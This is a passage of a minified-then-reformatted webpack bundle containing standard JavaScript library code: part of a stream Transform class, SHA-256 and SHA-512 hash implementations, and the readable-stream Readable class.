            if (stream._transformState.transforming) throw new ERR_TRANSFORM_ALREADY_TRANSFORMING();
            return stream.push(null);
        }
        __webpack_require__(3)(Transform, Duplex),
            (Transform.prototype.push = function (chunk, encoding) {
                return (this._transformState.needTransform = !1), Duplex.prototype.push.call(this, chunk, encoding);
            }),
            (Transform.prototype._transform = function (chunk, encoding, cb) {
                cb(new ERR_METHOD_NOT_IMPLEMENTED("_transform()"));
            }),
            (Transform.prototype._write = function (chunk, encoding, cb) {
                var ts = this._transformState;
                if (((ts.writecb = cb), (ts.writechunk = chunk), (ts.writeencoding = encoding), !ts.transforming)) {
                    var rs = this._readableState;
                    (ts.needTransform || rs.needReadable || rs.length < rs.highWaterMark) && this._read(rs.highWaterMark);
                }
            }),
            (Transform.prototype._read = function (n) {
                var ts = this._transformState;
                null === ts.writechunk || ts.transforming ? (ts.needTransform = !0) : ((ts.transforming = !0), this._transform(ts.writechunk, ts.writeencoding, ts.afterTransform));
            }),
            (Transform.prototype._destroy = function (err, cb) {
                Duplex.prototype._destroy.call(this, err, function (err2) {
                    cb(err2);
                });
            });
    },
    function (module, exports, __webpack_require__) {
        var inherits = __webpack_require__(3),
            Hash = __webpack_require__(27),
            Buffer = __webpack_require__(5).Buffer,
            K = [
                1116352408,
                1899447441,
                3049323471,
                3921009573,
                961987163,
                1508970993,
                2453635748,
                2870763221,
                3624381080,
                310598401,
                607225278,
                1426881987,
                1925078388,
                2162078206,
                2614888103,
                3248222580,
                3835390401,
                4022224774,
                264347078,
                604807628,
                770255983,
                1249150122,
                1555081692,
                1996064986,
                2554220882,
                2821834349,
                2952996808,
                3210313671,
                3336571891,
                3584528711,
                113926993,
                338241895,
                666307205,
                773529912,
                1294757372,
                1396182291,
                1695183700,
                1986661051,
                2177026350,
                2456956037,
                2730485921,
                2820302411,
                3259730800,
                3345764771,
                3516065817,
                3600352804,
                4094571909,
                275423344,
                430227734,
                506948616,
                659060556,
                883997877,
                958139571,
                1322822218,
                1537002063,
                1747873779,
                1955562222,
                2024104815,
                2227730452,
                2361852424,
                2428436474,
                2756734187,
                3204031479,
                3329325298,
            ],
            W = new Array(64);
        function Sha256() {
            this.init(), (this._w = W), Hash.call(this, 64, 56);
        }
        function ch(x, y, z) {
            return z ^ (x & (y ^ z));
        }
        function maj(x, y, z) {
            return (x & y) | (z & (x | y));
        }
        function sigma0(x) {
            return ((x >>> 2) | (x << 30)) ^ ((x >>> 13) | (x << 19)) ^ ((x >>> 22) | (x << 10));
        }
        function sigma1(x) {
            return ((x >>> 6) | (x << 26)) ^ ((x >>> 11) | (x << 21)) ^ ((x >>> 25) | (x << 7));
        }
        function gamma0(x) {
            return ((x >>> 7) | (x << 25)) ^ ((x >>> 18) | (x << 14)) ^ (x >>> 3);
        }
        inherits(Sha256, Hash),
            (Sha256.prototype.init = function () {
                return (this._a = 1779033703), (this._b = 3144134277), (this._c = 1013904242), (this._d = 2773480762), (this._e = 1359893119), (this._f = 2600822924), (this._g = 528734635), (this._h = 1541459225), this;
            }),
            (Sha256.prototype._update = function (M) {
                for (var x, W = this._w, a = 0 | this._a, b = 0 | this._b, c = 0 | this._c, d = 0 | this._d, e = 0 | this._e, f = 0 | this._f, g = 0 | this._g, h = 0 | this._h, i = 0; i < 16; ++i) W[i] = M.readInt32BE(4 * i);
                for (; i < 64; ++i) W[i] = 0 | (((((x = W[i - 2]) >>> 17) | (x << 15)) ^ ((x >>> 19) | (x << 13)) ^ (x >>> 10)) + W[i - 7] + gamma0(W[i - 15]) + W[i - 16]);
                for (var j = 0; j < 64; ++j) {
                    var T1 = (h + sigma1(e) + ch(e, f, g) + K[j] + W[j]) | 0,
                        T2 = (sigma0(a) + maj(a, b, c)) | 0;
                    (h = g), (g = f), (f = e), (e = (d + T1) | 0), (d = c), (c = b), (b = a), (a = (T1 + T2) | 0);
                }
                (this._a = (a + this._a) | 0),
                    (this._b = (b + this._b) | 0),
                    (this._c = (c + this._c) | 0),
                    (this._d = (d + this._d) | 0),
                    (this._e = (e + this._e) | 0),
                    (this._f = (f + this._f) | 0),
                    (this._g = (g + this._g) | 0),
                    (this._h = (h + this._h) | 0);
            }),
            (Sha256.prototype._hash = function () {
                var H = Buffer.allocUnsafe(32);
                return (
                    H.writeInt32BE(this._a, 0),
                    H.writeInt32BE(this._b, 4),
                    H.writeInt32BE(this._c, 8),
                    H.writeInt32BE(this._d, 12),
                    H.writeInt32BE(this._e, 16),
                    H.writeInt32BE(this._f, 20),
                    H.writeInt32BE(this._g, 24),
                    H.writeInt32BE(this._h, 28),
                    H
                );
            }),
            (module.exports = Sha256);
    },
    function (module, exports, __webpack_require__) {
        var inherits = __webpack_require__(3),
            Hash = __webpack_require__(27),
            Buffer = __webpack_require__(5).Buffer,
            K = [
                1116352408,
                3609767458,
                1899447441,
                602891725,
                3049323471,
                3964484399,
                3921009573,
                2173295548,
                961987163,
                4081628472,
                1508970993,
                3053834265,
                2453635748,
                2937671579,
                2870763221,
                3664609560,
                3624381080,
                2734883394,
                310598401,
                1164996542,
                607225278,
                1323610764,
                1426881987,
                3590304994,
                1925078388,
                4068182383,
                2162078206,
                991336113,
                2614888103,
                633803317,
                3248222580,
                3479774868,
                3835390401,
                2666613458,
                4022224774,
                944711139,
                264347078,
                2341262773,
                604807628,
                2007800933,
                770255983,
                1495990901,
                1249150122,
                1856431235,
                1555081692,
                3175218132,
                1996064986,
                2198950837,
                2554220882,
                3999719339,
                2821834349,
                766784016,
                2952996808,
                2566594879,
                3210313671,
                3203337956,
                3336571891,
                1034457026,
                3584528711,
                2466948901,
                113926993,
                3758326383,
                338241895,
                168717936,
                666307205,
                1188179964,
                773529912,
                1546045734,
                1294757372,
                1522805485,
                1396182291,
                2643833823,
                1695183700,
                2343527390,
                1986661051,
                1014477480,
                2177026350,
                1206759142,
                2456956037,
                344077627,
                2730485921,
                1290863460,
                2820302411,
                3158454273,
                3259730800,
                3505952657,
                3345764771,
                106217008,
                3516065817,
                3606008344,
                3600352804,
                1432725776,
                4094571909,
                1467031594,
                275423344,
                851169720,
                430227734,
                3100823752,
                506948616,
                1363258195,
                659060556,
                3750685593,
                883997877,
                3785050280,
                958139571,
                3318307427,
                1322822218,
                3812723403,
                1537002063,
                2003034995,
                1747873779,
                3602036899,
                1955562222,
                1575990012,
                2024104815,
                1125592928,
                2227730452,
                2716904306,
                2361852424,
                442776044,
                2428436474,
                593698344,
                2756734187,
                3733110249,
                3204031479,
                2999351573,
                3329325298,
                3815920427,
                3391569614,
                3928383900,
                3515267271,
                566280711,
                3940187606,
                3454069534,
                4118630271,
                4000239992,
                116418474,
                1914138554,
                174292421,
                2731055270,
                289380356,
                3203993006,
                460393269,
                320620315,
                685471733,
                587496836,
                852142971,
                1086792851,
                1017036298,
                365543100,
                1126000580,
                2618297676,
                1288033470,
                3409855158,
                1501505948,
                4234509866,
                1607167915,
                987167468,
                1816402316,
                1246189591,
            ],
            W = new Array(160);
        function Sha512() {
            this.init(), (this._w = W), Hash.call(this, 128, 112);
        }
        function Ch(x, y, z) {
            return z ^ (x & (y ^ z));
        }
        function maj(x, y, z) {
            return (x & y) | (z & (x | y));
        }
        function sigma0(x, xl) {
            return ((x >>> 28) | (xl << 4)) ^ ((xl >>> 2) | (x << 30)) ^ ((xl >>> 7) | (x << 25));
        }
        function sigma1(x, xl) {
            return ((x >>> 14) | (xl << 18)) ^ ((x >>> 18) | (xl << 14)) ^ ((xl >>> 9) | (x << 23));
        }
        function Gamma0(x, xl) {
            return ((x >>> 1) | (xl << 31)) ^ ((x >>> 8) | (xl << 24)) ^ (x >>> 7);
        }
        function Gamma0l(x, xl) {
            return ((x >>> 1) | (xl << 31)) ^ ((x >>> 8) | (xl << 24)) ^ ((x >>> 7) | (xl << 25));
        }
        function Gamma1(x, xl) {
            return ((x >>> 19) | (xl << 13)) ^ ((xl >>> 29) | (x << 3)) ^ (x >>> 6);
        }
        function Gamma1l(x, xl) {
            return ((x >>> 19) | (xl << 13)) ^ ((xl >>> 29) | (x << 3)) ^ ((x >>> 6) | (xl << 26));
        }
        function getCarry(a, b) {
            return a >>> 0 < b >>> 0 ? 1 : 0;
        }
        inherits(Sha512, Hash),
            (Sha512.prototype.init = function () {
                return (
                    (this._ah = 1779033703),
                    (this._bh = 3144134277),
                    (this._ch = 1013904242),
                    (this._dh = 2773480762),
                    (this._eh = 1359893119),
                    (this._fh = 2600822924),
                    (this._gh = 528734635),
                    (this._hh = 1541459225),
                    (this._al = 4089235720),
                    (this._bl = 2227873595),
                    (this._cl = 4271175723),
                    (this._dl = 1595750129),
                    (this._el = 2917565137),
                    (this._fl = 725511199),
                    (this._gl = 4215389547),
                    (this._hl = 327033209),
                    this
                );
            }),
            (Sha512.prototype._update = function (M) {
                for (
                    var W = this._w,
                        ah = 0 | this._ah,
                        bh = 0 | this._bh,
                        ch = 0 | this._ch,
                        dh = 0 | this._dh,
                        eh = 0 | this._eh,
                        fh = 0 | this._fh,
                        gh = 0 | this._gh,
                        hh = 0 | this._hh,
                        al = 0 | this._al,
                        bl = 0 | this._bl,
                        cl = 0 | this._cl,
                        dl = 0 | this._dl,
                        el = 0 | this._el,
                        fl = 0 | this._fl,
                        gl = 0 | this._gl,
                        hl = 0 | this._hl,
                        i = 0;
                    i < 32;
                    i += 2
                )
                    (W[i] = M.readInt32BE(4 * i)), (W[i + 1] = M.readInt32BE(4 * i + 4));
                for (; i < 160; i += 2) {
                    var xh = W[i - 30],
                        xl = W[i - 30 + 1],
                        gamma0 = Gamma0(xh, xl),
                        gamma0l = Gamma0l(xl, xh),
                        gamma1 = Gamma1((xh = W[i - 4]), (xl = W[i - 4 + 1])),
                        gamma1l = Gamma1l(xl, xh),
                        Wi7h = W[i - 14],
                        Wi7l = W[i - 14 + 1],
                        Wi16h = W[i - 32],
                        Wi16l = W[i - 32 + 1],
                        Wil = (gamma0l + Wi7l) | 0,
                        Wih = (gamma0 + Wi7h + getCarry(Wil, gamma0l)) | 0;
                    (Wih = ((Wih = (Wih + gamma1 + getCarry((Wil = (Wil + gamma1l) | 0), gamma1l)) | 0) + Wi16h + getCarry((Wil = (Wil + Wi16l) | 0), Wi16l)) | 0), (W[i] = Wih), (W[i + 1] = Wil);
                }
                for (var j = 0; j < 160; j += 2) {
                    (Wih = W[j]), (Wil = W[j + 1]);
                    var majh = maj(ah, bh, ch),
                        majl = maj(al, bl, cl),
                        sigma0h = sigma0(ah, al),
                        sigma0l = sigma0(al, ah),
                        sigma1h = sigma1(eh, el),
                        sigma1l = sigma1(el, eh),
                        Kih = K[j],
                        Kil = K[j + 1],
                        chh = Ch(eh, fh, gh),
                        chl = Ch(el, fl, gl),
                        t1l = (hl + sigma1l) | 0,
                        t1h = (hh + sigma1h + getCarry(t1l, hl)) | 0;
                    t1h = ((t1h = ((t1h = (t1h + chh + getCarry((t1l = (t1l + chl) | 0), chl)) | 0) + Kih + getCarry((t1l = (t1l + Kil) | 0), Kil)) | 0) + Wih + getCarry((t1l = (t1l + Wil) | 0), Wil)) | 0;
                    var t2l = (sigma0l + majl) | 0,
                        t2h = (sigma0h + majh + getCarry(t2l, sigma0l)) | 0;
                    (hh = gh),
                        (hl = gl),
                        (gh = fh),
                        (gl = fl),
                        (fh = eh),
                        (fl = el),
                        (eh = (dh + t1h + getCarry((el = (dl + t1l) | 0), dl)) | 0),
                        (dh = ch),
                        (dl = cl),
                        (ch = bh),
                        (cl = bl),
                        (bh = ah),
                        (bl = al),
                        (ah = (t1h + t2h + getCarry((al = (t1l + t2l) | 0), t1l)) | 0);
                }
                (this._al = (this._al + al) | 0),
                    (this._bl = (this._bl + bl) | 0),
                    (this._cl = (this._cl + cl) | 0),
                    (this._dl = (this._dl + dl) | 0),
                    (this._el = (this._el + el) | 0),
                    (this._fl = (this._fl + fl) | 0),
                    (this._gl = (this._gl + gl) | 0),
                    (this._hl = (this._hl + hl) | 0),
                    (this._ah = (this._ah + ah + getCarry(this._al, al)) | 0),
                    (this._bh = (this._bh + bh + getCarry(this._bl, bl)) | 0),
                    (this._ch = (this._ch + ch + getCarry(this._cl, cl)) | 0),
                    (this._dh = (this._dh + dh + getCarry(this._dl, dl)) | 0),
                    (this._eh = (this._eh + eh + getCarry(this._el, el)) | 0),
                    (this._fh = (this._fh + fh + getCarry(this._fl, fl)) | 0),
                    (this._gh = (this._gh + gh + getCarry(this._gl, gl)) | 0),
                    (this._hh = (this._hh + hh + getCarry(this._hl, hl)) | 0);
            }),
            (Sha512.prototype._hash = function () {
                var H = Buffer.allocUnsafe(64);
                function writeInt64BE(h, l, offset) {
                    H.writeInt32BE(h, offset), H.writeInt32BE(l, offset + 4);
                }
                return (
                    writeInt64BE(this._ah, this._al, 0),
                    writeInt64BE(this._bh, this._bl, 8),
                    writeInt64BE(this._ch, this._cl, 16),
                    writeInt64BE(this._dh, this._dl, 24),
                    writeInt64BE(this._eh, this._el, 32),
                    writeInt64BE(this._fh, this._fl, 40),
                    writeInt64BE(this._gh, this._gl, 48),
                    writeInt64BE(this._hh, this._hl, 56),
                    H
                );
            }),
            (module.exports = Sha512);
    },
    function (module, exports, __webpack_require__) {
        "use strict";
        (function (global, process) {
            var pna = __webpack_require__(38);
            module.exports = Readable;
            var Duplex,
                isArray = __webpack_require__(75);
            Readable.ReadableState = ReadableState;
            __webpack_require__(20).EventEmitter;
            var EElistenerCount = function (emitter, type) {
                    return emitter.listeners(type).length;
                },
                Stream = __webpack_require__(92),
                Buffer = __webpack_require__(5).Buffer,
                OurUint8Array = global.Uint8Array || function () {};
            var util = Object.create(__webpack_require__(34));
            util.inherits = __webpack_require__(3);
            var debugUtil = __webpack_require__(205),
                debug = void 0;
            debug = debugUtil && debugUtil.debuglog ? debugUtil.debuglog("stream") : function () {};
            var StringDecoder,
                BufferList = __webpack_require__(206),
                destroyImpl = __webpack_require__(93);
            util.inherits(Readable, Stream);
            var kProxyEvents = ["error", "close", "destroy", "pause", "resume"];
            function ReadableState(options, stream) {
                options = options || {};
                var isDuplex = stream instanceof (Duplex = Duplex || __webpack_require__(22));
                (this.objectMode = !!options.objectMode), isDuplex && (this.objectMode = this.objectMode || !!options.readableObjectMode);
                var hwm = options.highWaterMark,
                    readableHwm = options.readableHighWaterMark,
                    defaultHwm = this.objectMode ? 16 : 16384;
                (this.highWaterMark = hwm || 0 === hwm ? hwm : isDuplex && (readableHwm || 0 === readableHwm) ? readableHwm : defaultHwm),
                    (this.highWaterMark = Math.floor(this.highWaterMark)),
                    (this.buffer = new BufferList()),
                    (this.length = 0),
                    (this.pipes = null),
                    (this.pipesCount = 0),
                    (this.flowing = null),
                    (this.ended = !1),
                    (this.endEmitted = !1),
                    (this.reading = !1),
                    (this.sync = !0),
                    (this.needReadable = !1),
                    (this.emittedReadable = !1),
                    (this.readableListening = !1),
                    (this.resumeScheduled = !1),
                    (this.destroyed = !1),
                    (this.defaultEncoding = options.defaultEncoding || "utf8"),
                    (this.awaitDrain = 0),
                    (this.readingMore = !1),
                    (this.decoder = null),
                    (this.encoding = null),
                    options.encoding && (StringDecoder || (StringDecoder = __webpack_require__(21).StringDecoder), (this.decoder = new StringDecoder(options.encoding)), (this.encoding = options.encoding));
            }
            function Readable(options) {
                if (((Duplex = Duplex || __webpack_require__(22)), !(this instanceof Readable))) return new Readable(options);
                (this._readableState = new ReadableState(options, this)),
                    (this.readable = !0),
                    options && ("function" == typeof options.read && (this._read = options.read), "function" == typeof options.destroy && (this._destroy = options.destroy)),
                    Stream.call(this);
            }
            function readableAddChunk(stream, chunk, encoding, addToFront, skipChunkCheck) {
                var er,
                    state = stream._readableState;
                null === chunk
                    ? ((state.reading = !1),
                      (function (stream, state) {
                          if (state.ended) return;
                          if (state.decoder) {
                              var chunk = state.decoder.end();
                              chunk && chunk.length && (state.buffer.push(chunk), (state.length += state.objectMode ? 1 : chunk.length));
                          }
                          (state.ended = !0), emitReadable(stream);
                      })(stream, state))
                    : (skipChunkCheck ||
                          (er = (function (state, chunk) {
                              var er;
                              (obj = chunk), Buffer.isBuffer(obj) || obj instanceof OurUint8Array || "string" == typeof chunk || void 0 === chunk || state.objectMode || (er = new TypeError("Invalid non-string/buffer chunk"));
                              var obj;
                              return er;
                          })(state, chunk)),
                      er
                          ? stream.emit("error", er)
                          : state.objectMode || (chunk && chunk.length > 0)
                          ? ("string" == typeof chunk ||
                                state.objectMode ||
                                Object.getPrototypeOf(chunk) === Buffer.prototype ||
                                (chunk = (function (chunk) {
                                    return Buffer.from(chunk);
                                })(chunk)),
                            addToFront
                                ? state.endEmitted
                                    ? stream.emit("error", new Error("stream.unshift() after end event"))
                                    : addChunk(stream, state, chunk, !0)
                                : state.ended
                                ? stream.emit("error", new Error("stream.push() after EOF"))
                                : ((state.reading = !1),
                                  state.decoder && !encoding
                                      ? ((chunk = state.decoder.write(chunk)), state.objectMode || 0 !== chunk.length ? addChunk(stream, state, chunk, !1) : maybeReadMore(stream, state))
                                      : addChunk(stream, state, chunk, !1)))
                          : addToFront || (state.reading = !1));
                return (function (state) {
                    return !state.ended && (state.needReadable || state.length < state.highWaterMark || 0 === state.length);
                })(state);
            }
            function addChunk(stream, state, chunk, addToFront) {
                state.flowing && 0 === state.length && !state.sync
                    ? (stream.emit("data", chunk), stream.read(0))
                    : ((state.length += state.objectMode ? 1 : chunk.length), addToFront ? state.buffer.unshift(chunk) : state.buffer.push(chunk), state.needReadable && emitReadable(stream)),
                    maybeReadMore(stream, state);
            }
            Object.defineProperty(Readable.prototype, "destroyed", {
                get: function () {
                    return void 0 !== this._readableState && this._readableState.destroyed;
                },
                set: function (value) {
                    this._readableState && (this._readableState.destroyed = value);
                },
            }),
                (Readable.prototype.destroy = destroyImpl.destroy),
                (Readable.prototype._undestroy = destroyImpl.undestroy),
                (Readable.prototype._destroy = function (err, cb) {
                    this.push(null), cb(err);
                }),
                (Readable.prototype.push = function (chunk, encoding) {
                    var skipChunkCheck,
                        state = this._readableState;
                    return (
                        state.objectMode
                            ? (skipChunkCheck = !0)
                            : "string" == typeof chunk && ((encoding = encoding || state.defaultEncoding) !== state.encoding && ((chunk = Buffer.from(chunk, encoding)), (encoding = "")), (skipChunkCheck = !0)),
                        readableAddChunk(this, chunk, encoding, !1, skipChunkCheck)
                    );
                }),
                (Readable.prototype.unshift = function (chunk) {
                    return readableAddChunk(this, chunk, null, !0, !1);
                }),
                (Readable.prototype.isPaused = function () {
                    return !1 === this._readableState.flowing;
                }),
                (Readable.prototype.setEncoding = function (enc) {
                    return StringDecoder || (StringDecoder = __webpack_require__(21).StringDecoder), (this._readableState.decoder = new StringDecoder(enc)), (this._readableState.encoding = enc), this;
                });
            function howMuchToRead(n, state) {
                return n <= 0 || (0 === state.length && state.ended)
                    ? 0
                    : state.objectMode
                    ? 1
                    : n != n
                    ? state.flowing && state.length
                        ? state.buffer.head.data.length
                        : state.length
                    : (n > state.highWaterMark &&
                          (state.highWaterMark = (function (n) {
                              return n >= 8388608 ? (n = 8388608) : (n--, (n |= n >>> 1), (n |= n >>> 2), (n |= n >>> 4), (n |= n >>> 8), (n |= n >>> 16), n++), n;
                          })(n)),
                      n <= state.length ? n : state.ended ? state.length : ((state.needReadable = !0), 0));
            }
            function emitReadable(stream) {
                var state = stream._readableState;
                (state.needReadable = !1), state.emittedReadable || (debug("emitReadable", state.flowing), (state.emittedReadable = !0), state.sync ? pna.nextTick(emitReadable_, stream) : emitReadable_(stream));
            }
            function emitReadable_(stream) {
                debug("emit readable"), stream.emit("readable"), flow(stream);
            }
            function maybeReadMore(stream, state) {
                state.readingMore || ((state.readingMore = !0), pna.nextTick(maybeReadMore_, stream, state));
            }
            function maybeReadMore_(stream, state) {
                for (var len = state.length; !state.reading && !state.flowing && !state.ended && state.length < state.highWaterMark && (debug("maybeReadMore read 0"), stream.read(0), len !== state.length); ) len = state.length;
                state.readingMore = !1;
            }
            function nReadingNextTick(self) {
                debug("readable nexttick read 0"), self.read(0);
            }
            function resume_(stream, state) {
                state.reading || (debug("resume read 0"), stream.read(0)), (state.resumeScheduled = !1), (state.awaitDrain = 0), stream.emit("resume"), flow(stream), state.flowing && !state.reading && stream.read(0);
            }
            function flow(stream) {
                var state = stream._readableState;
                for (debug("flow", state.flowing); state.flowing && null !== stream.read(); );
            }
            function fromList(n, state) {
                return 0 === state.length
                    ? null
                    : (state.objectMode
                          ? (ret = state.buffer.shift())
                          : !n || n >= state.length
                          ? ((ret = state.decoder ? state.buffer.join("") : 1 === state.buffer.length ? state.buffer.head.data : state.buffer.concat(state.length)), state.buffer.clear())
                          : (ret = (function (n, list, hasStrings) {
                                var ret;
                                n < list.head.data.length
                                    ? ((ret = list.head.data.slice(0, n)), (list.head.data = list.head.data.slice(n)))
                                    : (ret =
                                          n === list.head.data.length
                                              ? list.shift()
                                              : hasStrings
                                              ? (function (n, list) {
                                                    var p = list.head,
                                                        c = 1,
                                                        ret = p.data;
                                                    n -= ret.length;
                                                    for (; (p = p.next); ) {
                                                        var str = p.data,
                                                            nb = n > str.length ? str.length : n;
                                                        if ((nb === str.length ? (ret += str) : (ret += str.slice(0, n)), 0 === (n -= nb))) {
                                                            nb === str.length ? (++c, p.next ? (list.head = p.next) : (list.head = list.tail = null)) : ((list.head = p), (p.data = str.slice(nb)));
                                                            break;
                                                        }
                                                        ++c;
                                                    }
                                                    return (list.length -= c), ret;
                                                })(n, list)
                                              : (function (n, list) {
                                                    var ret = Buffer.allocUnsafe(n),
                                                        p = list.head,
                                                        c = 1;
                                                    p.data.copy(ret), (n -= p.data.length);
                                                    for (; (p = p.next); ) {
                                                        var buf = p.data,
                                                            nb = n > buf.length ? buf.length : n;
                                                        if ((buf.copy(ret, ret.length - n, 0, nb), 0 === (n -= nb))) {
                                                            nb === buf.length ? (++c, p.next ? (list.head = p.next) : (list.head = list.tail = null)) : ((list.head = p), (p.data = buf.slice(nb)));
                                                            break;
                                                        }
                                                        ++c;
                                                    }
                                                    return (list.length -= c), ret;
                                                })(n, list));
                                return ret;
                            })(n, state.buffer, state.decoder)),
                      ret);
                var ret;
            }
            function endReadable(stream) {
                var state = stream._readableState;
                if (state.length > 0) throw new Error('"endReadable()" called on non-empty stream');
                state.endEmitted || ((state.ended = !0), pna.nextTick(endReadableNT, state, stream));
            }
            function endReadableNT(state, stream) {
                state.endEmitted || 0 !== state.length || ((state.endEmitted = !0), (stream.readable = !1), stream.emit("end"));
            }
            function indexOf(xs, x) {
                for (var i = 0, l = xs.length; i < l; i++) if (xs[i] === x) return i;
                return -1;
            }
            (Readable.prototype.read = function (n) {
                debug("read", n), (n = parseInt(n, 10));
                var state = this._readableState,
                    nOrig = n;
                if ((0 !== n && (state.emittedReadable = !1), 0 === n && state.needReadable && (state.length >= state.highWaterMark || state.ended)))
                    return debug("read: emitReadable", state.length, state.ended), 0 === state.length && state.ended ? endReadable(this) : emitReadable(this), null;
                if (0 === (n = howMuchToRead(n, state)) && state.ended) return 0 === state.length && endReadable(this), null;
                var ret,
                    doRead = state.needReadable;
                return (
                    debug("need readable", doRead),
                    (0 === state.length || state.length - n < state.highWaterMark) && debug("length less than watermark", (doRead = !0)),
                    state.ended || state.reading
                        ? debug("reading or ended", (doRead = !1))
                        : doRead &&
                          (debug("do read"), (state.reading = !0), (state.sync = !0), 0 === state.length && (state.needReadable = !0), this._read(state.highWaterMark), (state.sync = !1), state.reading || (n = howMuchToRead(nOrig, state))),
                    null === (ret = n > 0 ? fromList(n, state) : null) ? ((state.needReadable = !0), (n = 0)) : (state.length -= n),
                    0 === state.length && (state.ended || (state.needReadable = !0), nOrig !== n && state.ended && endReadable(this)),
                    null !== ret && this.emit("data", ret),
                    ret
                );
            }),
                (Readable.prototype._read = function (n) {
                    this.emit("error", new Error("_read() is not implemented"));
                }),
                (Readable.prototype.pipe = function (dest, pipeOpts) {
                    var src = this,
                        state = this._readableState;
                    switch (state.pipesCount) {
                        case 0:
                            state.pipes = dest;
                            break;
                        case 1:
                            state.pipes = [state.pipes, dest];
                            break;
                        default:
                            state.pipes.push(dest);
                    }
                    (state.pipesCount += 1), debug("pipe count=%d opts=%j", state.pipesCount, pipeOpts);
                    var endFn = (!pipeOpts || !1 !== pipeOpts.end) && dest !== process.stdout && dest !== process.stderr ? onend : unpipe;
                    function onunpipe(readable, unpipeInfo) {
                        debug("onunpipe"),
                            readable === src &&
                                unpipeInfo &&
                                !1 === unpipeInfo.hasUnpiped &&
                                ((unpipeInfo.hasUnpiped = !0),
                                debug("cleanup"),
                                dest.removeListener("close", onclose),
                                dest.removeListener("finish", onfinish),
                                dest.removeListener("drain", ondrain),
                                dest.removeListener("error", onerror),
                                dest.removeListener("unpipe", onunpipe),
                                src.removeListener("end", onend),
                                src.removeListener("end", unpipe),
                                src.removeListener("data", ondata),
                                (cleanedUp = !0),
                                !state.awaitDrain || (dest._writableState && !dest._writableState.needDrain) || ondrain());
                    }
                    function onend() {
                        debug("onend"), dest.end();
                    }
                    state.endEmitted ? pna.nextTick(endFn) : src.once("end", endFn), dest.on("unpipe", onunpipe);
                    var ondrain = (function (src) {
                        return function () {
                            var state = src._readableState;
                            debug("pipeOnDrain", state.awaitDrain), state.awaitDrain && state.awaitDrain--, 0 === state.awaitDrain && EElistenerCount(src, "data") && ((state.flowing = !0), flow(src));
                        };
                    })(src);
                    dest.on("drain", ondrain);
                    var cleanedUp = !1;
                    var increasedAwaitDrain = !1;
                    function ondata(chunk) {
                        debug("ondata"),
                            (increasedAwaitDrain = !1),
                            !1 !== dest.write(chunk) ||
                                increasedAwaitDrain ||
                                (((1 === state.pipesCount && state.pipes === dest) || (state.pipesCount > 1 && -1 !== indexOf(state.pipes, dest))) &&
                                    !cleanedUp &&
                                    (debug("false write response, pause", src._readableState.awaitDrain), src._readableState.awaitDrain++, (increasedAwaitDrain = !0)),
                                src.pause());
                    }
                    function onerror(er) {
                        debug("onerror", er), unpipe(), dest.removeListener("error", onerror), 0 === EElistenerCount(dest, "error") && dest.emit("error", er);
                    }
                    function onclose() {
                        dest.removeListener("finish", onfinish), unpipe();
                    }
                    function onfinish() {
                        debug("onfinish"), dest.removeListener("close", onclose), unpipe();
                    }
                    function unpipe() {
                        debug("unpipe"), src.unpipe(dest);
                    }
                    return (
                        src.on("data", ondata),
                        (function (emitter, event, fn) {
                            if ("function" == typeof emitter.prependListener) return emitter.prependListener(event, fn);
                            emitter._events && emitter._events[event] ? (isArray(emitter._events[event]) ? emitter._events[event].unshift(fn) : (emitter._events[event] = [fn, emitter._events[event]])) : emitter.on(event, fn);
                        })(dest, "error", onerror),
                        dest.once("close", onclose),
                        dest.once("finish", onfinish),
                        dest.emit("pipe", src),
                        state.flowing || (debug("pipe resume"), src.resume()),
                        dest
                    );
                }),
                (Readable.prototype.unpipe = function (dest) {
                    var state = this._readableState,
                        unpipeInfo = { hasUnpiped: !1 };
                    if (0 === state.pipesCount) return this;
                    if (1 === state.pipesCount)
                        return (dest && dest !== state.pipes) || (dest || (dest = state.pipes), (state.pipes = null), (state.pipesCount = 0), (state.flowing = !1), dest && dest.emit("unpipe", this, unpipeInfo)), this;
                    if (!dest) {
                        var dests = state.pipes,
                            len = state.pipesCount;
                        (state.pipes = null), (state.pipesCount = 0), (state.flowing = !1);
                        for (var i = 0; i < len; i++) dests[i].emit("unpipe", this, unpipeInfo);
                        return this;
                    }
                    var index = indexOf(state.pipes, dest);
                    return -1 === index || (state.pipes.splice(index, 1), (state.pipesCount -= 1), 1 === state.pipesCount && (state.pipes = state.pipes[0]), dest.emit("unpipe", this, unpipeInfo)), this;
                }),
                (Readable.prototype.on = function (ev, fn) {
                    var res = Stream.prototype.on.call(this, ev, fn);
                    if ("data" === ev) !1 !== this._readableState.flowing && this.resume();
                    else if ("readable" === ev) {
                        var state = this._readableState;
                        state.endEmitted ||
                            state.readableListening ||
                            ((state.readableListening = state.needReadable = !0), (state.emittedReadable = !1), state.reading ? state.length && emitReadable(this) : pna.nextTick(nReadingNextTick, this));
                    }
                    return res;
                }),
                (Readable.prototype.addListener = Readable.prototype.on),
                (Readable.prototype.resume = function () {
                    var state = this._readableState;
                    return (
                        state.flowing ||
                            (debug("resume"),
                            (state.flowing = !0),
                            (function (stream, state) {
                                state.resumeScheduled || ((state.resumeScheduled = !0), pna.nextTick(resume_, stream, state));
                            })(this, state)),
                        this
                    );
                }),
                (Readable.prototype.pause = function () {
                    return debug("call pause flowing=%j", this._readableState.flowing), !1 !== this._readableState.flowing && (debug("pause"), (this._readableState.flowing = !1), this.emit("pause")), this;
                }),
                (Readable.prototype.wrap = function (stream) {
                    var _this = this,
                        state = this._readableState,
                        paused = !1;
                    for (var i in (stream.on("end", function () {
                        if ((debug("wrapped end"), state.decoder && !state.ended)) {
                            var chunk = state.decoder.end();
                            chunk && chunk.length && _this.push(chunk);
                        }
                        _this.push(null);
                    }),
                    stream.on("data", function (chunk) {
                        (debug("wrapped data"), state.decoder && (chunk = state.decoder.write(chunk)), state.objectMode && null == chunk) ||
                            ((state.objectMode || (chunk && chunk.length)) && (_this.push(chunk) || ((paused = !0), stream.pause())));
                    }),
                    stream))
                        void 0 === this[i] &&
                            "function" == typeof stream[i] &&
                            (this[i] = (function (method) {
                                return function () {
                                    return stream[method].apply(stream, arguments);
                                };
                            })(i));
                    for (var n = 0; n < kProxyEvents.length; n++) stream.on(kProxyEvents[n], this.emit.bind(this, kProxyEvents[n]));
                    return (
                        (this._read = function (n) {
                            debug("wrapped _read", n), paused && ((paused = !1), stream.resume());
                        }),
                        this
                    );
                }),
                Object.defineProperty(Readable.prototype, "readableHighWaterMark", {
                    enumerable: !1,
                    get: function () {
                        return this._readableState.highWaterMark;
                    },
                }),
                (Readable._fromList = fromList);
        }.call(this, __webpack_require__(8), __webpack_require__(7)));
    },
    function (module, exports, __webpack_require__) {
